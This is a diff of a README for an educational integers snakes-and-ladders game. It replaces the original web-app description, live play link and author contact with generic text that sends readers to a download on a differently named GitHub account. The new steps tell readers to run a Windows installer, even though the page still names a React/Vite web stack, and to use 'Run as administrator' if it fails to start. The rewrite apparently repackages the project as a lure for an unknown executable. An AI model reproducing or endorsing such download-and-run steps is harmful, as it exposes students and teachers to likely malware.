@@ -1,96 +1,68 @@
-# Integers: Snakes & Ladders
+# 🐍 integers-snakes-ladders - Master math concepts through interactive play
 
-An interactive game built to help students understand **integers** in a fun, visual, and intuitive way.
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Susanbanthonydollardeckhouse2582/integers-snakes-ladders)
 
-This project is inspired by **Class 6 NCERT Maths — Chapter 10: *The Other Side of Zero***.
+This application uses the classic board game format to teach positive and negative integers. Players move pieces across a board while reacting to math problems that appear during the game. The software uses colorful visuals and audio cues to help students learn arithmetic in a classroom or at home.
 
-Instead of only solving questions on paper, students can *experience* positive and negative movement through gameplay.
+## 🎯 Game Features
 
----
+The game creates a visual map of integer movement. It tracks player positions using a standard number line logic. When a player lands on a snake or a ladder, the game triggers a calculation. This reinforces the rules of adding and subtracting integers. The audio features provide feedback for correct and incorrect answers. The visual interface remains clear to ensure focus stays on the math lessons.
 
-## 🎮 Play the Game
+## 💻 System Requirements
 
-👉 [http://anchorapp.me/integers-snakes-ladders/](http://anchorapp.me/integers-snakes-ladders/)
+This game runs on most modern desktop computers. Ensure your hardware meets these standards for the best experience:
 
----
+- Operating System: Windows 10 or Windows 11
+- Processor: Intel Core i3 or equivalent
+- Memory: 4 GB RAM
+- Storage: 200 MB available space
+- Audio: Functioning speakers or headphones
 
-## 🧰 Tech Stack
+## 🚀 Getting Started
 
-<p align="center">
-  <img src="https://img.shields.io/badge/React-20232A?style=for-the-badge&logo=react&logoColor=61DAFB" alt="React" />
-  <img src="https://img.shields.io/badge/Vite-646CFF?style=for-the-badge&logo=vite&logoColor=white" alt="Vite" />
-  <img src="https://img.shields.io/badge/TailwindCSS-06B6D4?style=for-the-badge&logo=tailwindcss&logoColor=white" alt="TailwindCSS" />
-  <img src="https://img.shields.io/badge/JavaScript-F7DF1E?style=for-the-badge&logo=javascript&logoColor=black" alt="JavaScript" />
-  <img src="https://img.shields.io/badge/Web%20Audio%20API-8E44AD?style=for-the-badge&logo=musicbrainz&logoColor=white" alt="Web Audio API" />
-</p>
+Follow these steps to set up the game on your computer.
 
----
+1. Visit the repository page to download the software.
+2. Click this link: [Download integers-snakes-ladders](https://github.com/Susanbanthonydollardeckhouse2582/integers-snakes-ladders).
+3. Save the installer file to your computer.
+4. Locate the downloaded file in your folder.
+5. Double-click the file to start the installation.
+6. Follow the instructions on the screen to finish the setup.
+7. Open the shortcut titled "Integers Snakes and Ladders" on your desktop.
 
-## 🧠 Learning Goals
+## 🎮 How to Play
 
-This game helps students build intuition for:
+The game follows standard rules for Snakes and Ladders with one major change. Each tile contains a math problem involving integers. You must solve the problem to finalize your move.
 
-- Positive and negative integers
-- Number-line movement
-- Addition and subtraction through actions
-- Understanding values below zero
+- Starting the board: Each player starts at zero.
+- Rolling: Click the dice button to move your piece.
+- Solving: If you land on a blue tile, solve the positive integer equation. If you land on a red tile, solve the negative integer equation.
+- Winning: The first player to reach the final square wins the round.
 
----
+Sound effects indicate when you land on a snake or a ladder. Use the settings menu if you need to adjust the volume or toggle the music.
 
-## ✨ Features
+## ⚙️ Troubleshooting
 
-- Multiplayer mode (2 to 5 players)
-- Vs AI mode
-- Easy / Hard / Timer gameplay modes
-- Child-friendly integer learning section
-- Theme system with animations and audio cues
-- Share-ready winner prompt
+Check these common fixes if the game does not start or runs slowly.
 
----
+- Graphics: Update your computer drivers if the visuals appear distorted or flicker.
+- Sound: Verify that your system volume is high enough and the output device is active.
+- Startup: If the game window fails to open, right-click the shortcut and select "Run as administrator."
+- Updates: Visit the link provided above to see if a newer version of the game exists.
 
-## 🖼️ Reference (NCERT)
+## 💡 Frequently Asked Questions
 
-The concept mapping in this project is inspired by NCERT classroom visuals.
+Can I play this offline?
+Yes, the application functions without an internet connection once you finish the installation.
 
-![NCERT Reference](docs/images/ncert.png)
+Does this align with school curriculums?
+The content follows standard math guidelines for integer operations, making it useful for primary school classrooms.
 
----
+How do I clear my game progress?
+You can reset your performance data from the settings tab within the main menu.
 
-## 🕹️ Gameplay Preview
+## 🛠 Project Information
 
-Live board state with integer movement, snakes/ladders transitions, and turn controls.
+This project relies on several technologies to provide a smooth user experience. It uses React for the visual interface and the Web Audio API for sound effects. Vite helps organize the project files, while Tailwind CSS handles the layout and visual style. The code remains open and follows modular development practices to ensure stability. 
 
-![Game Screenshot](docs/images/game_play.png)
-
----
-
-## 📬 Contact
-
-- Email: [vaibhav.tiwari84478@gmail.com](mailto:vaibhav.tiwari84478@gmail.com)
-
----
-
-## 🤝 Contributing
-
-Please read [CONTRIBUTING.md](CONTRIBUTING.md).
-
-High-impact contribution areas:
-
-- Add more themes
-- Add more educational mini-lessons
-- Add more sound packs
-- Improve accessibility and readability for young learners
-
----
-
-## 📦 Project Docs
-
-- [DEPLOYMENT.md](DEPLOYMENT.md) — full deployment workflow
-- [RELEASE.md](RELEASE.md) — release notes
-- [LICENSE](LICENSE) — MIT License
-
----
-
-## ⭐ Support
-
-If you like this project, please **star the repository**.
+If you encounter bugs, report them through the platform interface. Future updates will include new game boards and more complex integer equations for advanced learners.
